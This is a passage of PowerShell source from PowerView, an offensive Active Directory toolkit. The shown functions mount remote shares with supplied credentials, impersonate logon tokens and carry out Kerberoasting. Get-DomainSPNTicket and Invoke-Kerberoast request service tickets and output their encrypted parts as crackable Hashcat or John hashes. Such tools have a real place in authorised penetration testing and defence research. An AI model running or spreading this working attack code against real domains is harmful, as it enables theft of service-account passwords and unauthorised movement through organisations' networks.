A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),
or a DOMAIN\username identity.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
            if ($Identity -match '.+\\.+') {
                # DOMAIN\groupname
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                $ObjectIdentity = $Identity
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $Context
        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}


function Add-RemoteConnection {
<#
.SYNOPSIS

Pseudo "mounts" a connection to a remote path using the specified
credential object, allowing for access of remote resources. If a -Path isn't
specified, a -ComputerName is required to pseudo-mount IPC$.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetAddConnection2W to make a 'temporary' (i.e. not saved) connection
to the specified remote -Path (\\UNC\share) with the alternate credentials specified in the
-Credential object. If a -Path isn't specified, a -ComputerName is required to pseudo-mount IPC$.

To destroy the connection, use Remove-RemoteConnection with the same specified \\UNC\share path
or -ComputerName.

.PARAMETER ComputerName

Specifies the system to add a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to add the connection for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

$Cred = Get-Credential
Add-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\' -Credential $Cred

.EXAMPLE

$Cred = Get-Credential
@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Add-RemoteConnection  -Credential $Cred
#>

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"

            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx
            #   CONNECT_TEMPORARY = 4
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Remove-RemoteConnection {
<#
.SYNOPSIS

Destroys a connection created by New-RemoteConnection.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetCancelConnection2 to destroy a connection created by
New-RemoteConnection. If a -Path isn't specified, a -ComputerName is required to
'unmount' \\$ComputerName\IPC$.

.PARAMETER ComputerName

Specifies the system to remove a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to remove the connection for.

.EXAMPLE

Remove-RemoteConnection -ComputerName 'PRIMARY.testlab.local'

.EXAMPLE

Remove-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\'

.EXAMPLE

@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Remove-RemoteConnection
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Invoke-UserImpersonation {
<#
.SYNOPSIS

Creates a new "runas /netonly" type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate "runas /netonly". The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate "runas.exe /netonly" functionality
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # actually impersonate the token from LogonUser()
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    $LogonTokenHandle
}


function Invoke-RevertToSelf {
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function Get-DomainSPNTicket {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Author: machosec, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of Hashcat).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'John'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote domain using Invoke-UserImpersonation.

.EXAMPLE

Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-DomainSPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR

Request kerberos service tickets for all users with non-null SPNs and output in JTR format.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

PowerView.User

Accepts one or more PowerView.User objects on the pipeline with the User parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {
<#
.SYNOPSIS

Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.

Author: Will Schroeder (@harmj0y), @machosec  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  

.DESCRIPTION

Uses Get-DomainUser to query for user accounts with non-null service principle
names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
The ticket format can be specified with -OutputFormat <John/Hashcat>.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'Hashcat'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Invoke-Kerberoast | fl

Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).

.EXAMPLE

Invoke-Kerberoast -Domain dev.testlab.local | fl

Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
format instead of Hashcat.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl

Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {
<#
.SYNOPSIS

Enumerates the ACL for a given file path.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertFrom-SID  

.DESCRIPTION

Enumerates the ACL for a specified file/folder path, and translates
the access rules for each entry into readable formats. If -Credential is passed,
Add-RemoteConnection/Remove-RemoteConnection is used to temporarily map the remote share.

.PARAMETER Path

Specifies the local or remote path to enumerate the ACLs for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target path.

.EXAMPLE

Get-PathAcl "\\SERVER\Share\"

Returns ACLs for the given UNC share.

.EXAMPLE

gci .\test.txt | Get-PathAcl

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
Get-PathAcl -Path "\\SERVER\Share\" -Credential $Cred

.INPUTS

String

One of more paths to enumerate ACLs for.

.OUTPUTS

PowerView.FileACL

A custom object with the full path and associated ACL entries.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()

            # get simple permission
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            # get remaining extended permissions
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        # map IPC$ to this computer if it's not already
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = Get-Acl -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $TargetPath
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $_"
            }
        }
    }

    END {
        # remove the IPC$ mappings
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {
<#
.SYNOPSIS

Helper that converts specific LDAP property result fields and outputs
a custom psobject.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Domain* function.

.PARAMETER Properties

Properties object to extract out LDAP fields for display.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with LDAP hashtable properties translated.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # convert all listed sids (i.e. if multiple are listed in sidHistory)
